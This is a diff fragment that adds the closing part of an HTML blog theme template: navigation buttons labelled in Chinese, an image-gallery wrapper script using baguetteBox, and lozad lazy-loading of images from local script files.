+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a role="button" id="darkbutton" class="basebutton darkwidget" aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a role="button" id="searchbutton" class="basebutton searchwidget" aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a>
+
+  
+  
+  
+  <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img');
+    var i;
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a');
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'));
+      wrapper.setAttribute('aria-label', 'illustration');
+      wrapper.style.cssText = 'width: 100%; display: flex; justify-content: center;';
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt;
+      wrapper.dataset.nolink = true;
+      img[i].before(wrapper);
+      wrapper.append(img[i]);
+      var divWrap = document.createElement('div');
+      divWrap.classList.add('gallery');
+      wrapper.before(divWrap);
+      divWrap.append(wrapper);
+    }
+    baguetteBox.run('.gallery');
+  }
+</script>
+<script>loadScript("/js/lib/lightbox/baguetteBox.min.js", addImgLayout)</script>
+  
+  
+  
+<script src="/js/main.js"></script>
+
+  
+  
+  <script>
+    var addLazyload = function () {
+      var observer = lozad('.lozad', {
+        load: function (el) {
+          el.srcset = el.getAttribute('data-src');
+        },
+        loaded: function (el) {
+          el.classList.add('loaded');
+        }
+      });
+      observer.observe();
+    }
+  </script>
+  <script>loadScript("/js/lib/lozad.min.js", addLazyload)</script>
+  
+  
+</body>
+
+</html>
